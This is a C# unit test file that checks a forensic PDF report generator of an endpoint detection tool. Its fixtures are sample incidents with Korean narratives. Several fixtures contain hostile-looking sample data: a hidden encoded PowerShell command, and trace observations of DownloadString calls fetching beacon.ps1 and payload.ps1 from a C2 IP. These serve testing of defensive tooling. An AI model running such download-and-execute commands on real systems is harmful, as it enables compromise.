namespace Phalanx.Agent.Tests;

using System;
using System.IO;
using Phalanx.Cockpit.Reporting;
using Phalanx.Cockpit.ViewModels;
using Xunit;

[Trait("Category", "Unit")]
public class ForensicPdfReportGeneratorTests
{
    [Fact]
    public void GenerateReportBytes_WithCriticalKillIncident_ReturnsValidPdfBytes()
    {
        // 1. Arrange
        var incident = new IncidentItemViewModel
        {
            IncidentId = "INC-TEST-001",
            Timestamp = DateTime.UtcNow,
            TargetPid = 4321,
            TargetImage = @"C:\Windows\System32\powershell.exe",
            CommandLine = "powershell.exe -w hidden -enc JABjAGwAYQ...",
            ParentPid = 1234,
            ParentImage = @"C:\Windows\explorer.exe",
            VerdictAction = "ACTION_KILL",
            StatusSeverity = "CRITICAL",
            ConfidenceScore = 0.96,
            SummaryTitle = "Office LOLBAS C2 Dropper Attack",
            Narrative = "워드 프로세스에서 파워셸을 비정상 분기하여 외부 C2 서버와 통신을 시도하였으며, Shannon 엔트로피 분석 및 네트워크 평판 조회를 통해 침해를 확증했습니다.",
            BlockedIp = "185.220.101.5",
            ElapsedMs = 45.2
        };
        incident.MitreTactics.Add("T1059.001");
        incident.MitreTactics.Add("T1105");
        incident.RemediationSteps.Add("1. 타깃 프로세스(PID: 4321) 즉시 강제 종료(ACTION_KILL)");
        incident.RemediationSteps.Add("2. 악성 C2 IP(185.220.101.5) Windows 고급 방화벽 아웃바운드 영구 차단");
        incident.Traces.Add(new ReActStepViewModel
        {
            StepNumber = 1,
            ActionTool = "DecodePayloadTool",
            Thought = "인코딩된 파워셸 인자를 분석하여 C2 주소를 추출합니다.",
            ActionArgsJson = "{\"encodedCommand\":\"...\"}",
            Observation = "DownloadString('http://185.220.101.5/beacon.ps1')",
            ElapsedMs = 12.1
        });
        incident.Traces.Add(new ReActStepViewModel
        {
            StepNumber = 2,
            ActionTool = "ThreatReputationTool",
            Thought = "추출된 IP 주소의 위협 평판을 조회합니다.",
            ActionArgsJson = "{\"indicator\":\"185.220.101.5\"}",
            Observation = "Malicious C2 - Cobalt Strike Team Server",
            ElapsedMs = 18.5
        });

        var generator = new ForensicPdfReportGenerator();

        // 2. Act
        byte[] bytes = generator.GenerateReportBytes(incident);

        // 3. Assert
        Assert.NotNull(bytes);
        Assert.True(bytes.Length > 2048, $"PDF 크기가 너무 작습니다: {bytes.Length} bytes");
        // PDF Magic Bytes: "%PDF-" (0x25, 0x50, 0x44, 0x46, 0x2D)
        Assert.Equal(0x25, bytes[0]); // '%'
        Assert.Equal(0x50, bytes[1]); // 'P'
        Assert.Equal(0x44, bytes[2]); // 'D'
        Assert.Equal(0x46, bytes[3]); // 'F'
        Assert.Equal(0x2D, bytes[4]); // '-'
    }

    [Fact]
    public void GenerateReportBytes_WithBenignResumeIncident_ReturnsValidPdfBytes()
    {
        // 1. Arrange
        var incident = new IncidentItemViewModel
        {
            IncidentId = "INC-TEST-002",
            Timestamp = DateTime.UtcNow,
            TargetPid = 5678,
            TargetImage = @"C:\Windows\System32\powershell.exe",
            CommandLine = "powershell.exe -NoProfile -Command \"Get-Service\"",
            ParentPid = 1234,
            ParentImage = @"C:\Windows\explorer.exe",
            VerdictAction = "ACTION_RESUME",
            StatusSeverity = "BENIGN",
            ConfidenceScore = 0.99,
            SummaryTitle = "Benign Admin Maintenance Script",
            Narrative = "사내 관리자 유지보수 스크립트로 무해함이 검증되어 정상 복구되었습니다.",
            ElapsedMs = 15.0
        };
        incident.RemediationSteps.Add("1. 정상 프로세스 원자적 동결 해제(ACTION_RESUME)");

        var generator = new ForensicPdfReportGenerator();

        // 2. Act
        byte[] bytes = generator.GenerateReportBytes(incident);

        // 3. Assert
        Assert.NotNull(bytes);
        Assert.True(bytes.Length > 1024);
        Assert.Equal(0x25, bytes[0]); // '%'
        Assert.Equal(0x50, bytes[1]); // 'P'
        Assert.Equal(0x44, bytes[2]); // 'D'
        Assert.Equal(0x46, bytes[3]); // 'F'
        Assert.Equal(0x2D, bytes[4]); // '-'
    }

    [Fact]
    public void ExportReportToFile_WritesPdfToSpecifiedDirectory()
    {
        // 1. Arrange
        string tempDir = Path.Combine(Path.GetTempPath(), "Phalanx_Report_Test_" + Guid.NewGuid().ToString("N"));
        try
        {
            var incident = new IncidentItemViewModel
            {
                IncidentId = "INC-EXPORT-001",
                VerdictAction = "ACTION_KILL",
                TargetImage = @"C:\Windows\System32\cmd.exe",
                TargetPid = 9999,
                SummaryTitle = "Export File Verification Incident"
            };
            var generator = new ForensicPdfReportGenerator();

            // 2. Act
            string savedPath = generator.ExportReportToFile(incident, tempDir);

            // 3. Assert
            Assert.True(File.Exists(savedPath));
            var info = new FileInfo(savedPath);
            Assert.True(info.Length > 1024);
            Assert.Contains("Phalanx_Forensic_Report_INC-EXPORT-001", Path.GetFileName(savedPath));
            Assert.EndsWith(".pdf", savedPath, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, true);
            }
        }
    }

    [Fact]
    public void GenerateReportBytes_WithEmptyTracesAndLongCommandLine_DoesNotThrow()
    {
        // 1. Arrange - 엣지 케이스: 빈 트레이스, 5,000자 초장문 커맨드라인, 3,000자 서사
        var incident = new IncidentItemViewModel
        {
            IncidentId = "INC-EDGE-001",
            VerdictAction = "SUSPENDED",
            StatusSeverity = "SUSPENDED",
            CommandLine = new string('A', 5000), // 5,000자 연속 문자열
            Narrative = new string('B', 3000),
            SummaryTitle = "Extreme Edge Case Stress Test"
        };
        var generator = new ForensicPdfReportGenerator();

        // 2. Act & Assert
        byte[]? bytes = null;
        var ex = Record.Exception(() => bytes = generator.GenerateReportBytes(incident));

        Assert.Null(ex);
        Assert.NotNull(bytes);
        Assert.True(bytes.Length > 1024);
        Assert.Equal(0x25, bytes[0]); // '%'
    }

    [Fact]
    public void ExportReportToFilePath_WritesPdfToSpecifiedExactPath()
    {
        // 1. Arrange
        string tempDir = Path.Combine(Path.GetTempPath(), "Phalanx_Report_Custom_" + Guid.NewGuid().ToString("N"));
        string targetFilePath = Path.Combine(tempDir, "SubDir", "Custom_Forensic_Report.pdf");

        try
        {
            var incident = new IncidentItemViewModel
            {
                IncidentId = "INC-CUSTOM-PATH-001",
                VerdictAction = "ACTION_KILL",
                TargetImage = @"C:\Windows\System32\cmd.exe",
                TargetPid = 7777,
                SummaryTitle = "Custom Target File Path Verification"
            };
            var generator = new ForensicPdfReportGenerator();

            // 2. Act
            string savedPath = generator.ExportReportToFilePath(incident, targetFilePath);

            // 3. Assert
            Assert.True(File.Exists(savedPath));
            Assert.Equal(Path.GetFullPath(targetFilePath), savedPath);
            var info = new FileInfo(savedPath);
            Assert.True(info.Length > 1024);
            Assert.Equal("Custom_Forensic_Report.pdf", Path.GetFileName(savedPath));

            byte[] header = new byte[5];
            using (var fs = File.OpenRead(savedPath))
            {
                fs.ReadExactly(header, 0, 5);
            }
            Assert.Equal(0x25, header[0]); // '%'
            Assert.Equal(0x50, header[1]); // 'P'
            Assert.Equal(0x44, header[2]); // 'D'
            Assert.Equal(0x46, header[3]); // 'F'
            Assert.Equal(0x2D, header[4]); // '-'
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, true);
            }
        }
    }

    [Fact]
    public void GenerateReportBytes_ProducesSinglePageExecutiveBrief()
    {
        // 1. Arrange
        var incident = new IncidentItemViewModel
        {
            IncidentId = "INC-ONEPAGE-001",
            Timestamp = DateTime.UtcNow,
            TargetPid = 12345,
            TargetImage = @"C:\Windows\System32\powershell.exe",
            CommandLine = "powershell.exe -w hidden -enc JABjAGwAYQBz...",
            ParentPid = 9999,
            ParentImage = @"C:\Windows\explorer.exe",
            VerdictAction = "ACTION_KILL",
            StatusSeverity = "CRITICAL",
            ConfidenceScore = 0.98,
            SummaryTitle = "Single Page Layout Verification Incident",
            Narrative = "A4 단일 페이지 완결형(One-Page Executive Brief) 레이아웃이 적용되어 1번부터 6번 검증 블록까지 단 1장의 A4에 안정적으로 완결되는지 검증합니다.",
            BlockedIp = "185.220.101.5",
            ElapsedMs = 1234.5
        };
        incident.MitreTactics.Add("T1059.001");
        incident.RemediationSteps.Add("1. 악성 C2 IP 차단 완료");
        incident.RemediationSteps.Add("2. 타깃 프로세스 강제 사살");
        incident.Traces.Add(new ReActStepViewModel
        {
            StepNumber = 1,
            ActionTool = "DecodePayloadTool",
            Thought = "난독화 명령을 해독합니다.",
            Observation = "DownloadString('http://185.220.101.5/payload.ps1')",
            ElapsedMs = 2500.0
        });
        incident.Traces.Add(new ReActStepViewModel
        {
            StepNumber = 2,
            ActionTool = "ThreatReputationTool",
            Thought = "C2 IP 평판을 조회합니다.",
            Observation = "Cobalt Strike C2 (98점)",
            ElapsedMs = 1500.0
        });

        var generator = new ForensicPdfReportGenerator();

        // 2. Act
        byte[] bytes = generator.GenerateReportBytes(incident);

        // 3. Assert
        Assert.NotNull(bytes);
        Assert.True(bytes.Length > 2048, $"단일 페이지 PDF 크기가 너무 작습니다: {bytes.Length} bytes");
        // PDF Magic bytes
        Assert.Equal(0x25, bytes[0]); // '%'
        Assert.Equal(0x50, bytes[1]); // 'P'
        Assert.Equal(0x44, bytes[2]); // 'D'
        Assert.Equal(0x46, bytes[3]); // 'F'
        Assert.Equal(0x2D, bytes[4]); // '-'

        // UTF-8 변환 후 PDF 내 단일 페이지 수납 지표 확인
        string pdfText = System.Text.Encoding.Latin1.GetString(bytes);
        int pageMatches = System.Text.RegularExpressions.Regex.Matches(pdfText, @"/Type\s*/Page\b").Count;
        Assert.Equal(1, pageMatches); // 단일 페이지 완결 검증!
    }

    [Fact]
    public void GenerateReportBytes_WithComplexMultiTurnIncident_ExpandsToMultiPageSafely()
    {
        // 1. Arrange - 6턴 이상의 복잡한 침해사고 시나리오
        var incident = new IncidentItemViewModel
        {
            IncidentId = "INC-COMPLEX-001",
            Timestamp = DateTime.UtcNow,
            TargetPid = 54321,
            TargetImage = @"C:\Windows\System32\powershell.exe",
            CommandLine = "powershell.exe -w hidden -enc JABjAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOw...",
            ParentPid = 1000,
            ParentImage = @"C:\Windows\explorer.exe",
            VerdictAction = "ACTION_KILL",
            StatusSeverity = "CRITICAL",
            ConfidenceScore = 0.99,
            SummaryTitle = "Complex Advanced Multi-Stage APT Attack Detection",
            Narrative = "다단계 악성 페이로드 해독, 파일 Authenticode 서명 검사, 인메모리 DLL 인젝션 스캔, 레지스트리 COM 하이재킹 분석, C2 네트워크 평판 조회를 순차 수행하여 국가 배후 공격 그룹의 회피형 지속성 침투를 확증하고 사살 조치하였습니다.",
            BlockedIp = "185.220.101.5",
            ElapsedMs = 45210.0
        };
        incident.MitreTactics.Add("T1566.001");
        incident.MitreTactics.Add("T1059.001");
        incident.MitreTactics.Add("T1055");
        incident.MitreTactics.Add("T1547.001");
        incident.MitreTactics.Add("T1071.001");

        for (int i = 1; i <= 10; i++)
        {
            incident.Traces.Add(new ReActStepViewModel
            {
                StepNumber = i,
                ActionTool = (i % 6) switch
                {
                    1 => "DecodePayloadTool",
                    2 => "FileInspectionTool",
                    3 => "ProcessMemoryScanTool",
                    4 => "RegistryInspectionTool",
                    5 => "ThreatReputationTool",
                    _ => "MitreClassifierTool"
                },
                Thought = $"단계 {i}: 공격자의 다차원 은닉 행위를 조사하기 위해 도구를 호출하고 결과를 검증합니다. 심층 추론 분석을 수행하여 침해 지표를 확증합니다.",
                Observation = $"[도구 {i} 실행 결과] 관측 지표 및 위협 신호가 식별되었습니다. 파일 해시, 레지스트리 키, 메모리 주소 및 외부 통신 지표가 분석되었습니다.",
                ElapsedMs = 2000.0 + i * 500
            });
        }

        incident.RemediationSteps.Add("1. 악성 C2 IP 차단 완료");
        incident.RemediationSteps.Add("2. 타깃 프로세스 강제 사살");
        incident.RemediationSteps.Add("3. 레지스트리 지속성 Run 키 삭제");
        incident.RemediationSteps.Add("4. 엔드포인트 네트워크 격리 및 계정 초기화");

        var generator = new ForensicPdfReportGenerator();

        // 2. Act
        byte[] bytes = generator.GenerateReportBytes(incident);

        // 3. Assert
        Assert.NotNull(bytes);
        Assert.True(bytes.Length > 3072);

        string pdfText = System.Text.Encoding.Latin1.GetString(bytes);
        int pageMatches = System.Text.RegularExpressions.Regex.Matches(pdfText, @"/Type\s*/Page\b").Count;
        Assert.True(pageMatches >= 2, $"10턴 이상의 대형 침해사고는 안전하게 2페이지 이상으로 확장되어야 합니다. 실제: {pageMatches}");
    }
}
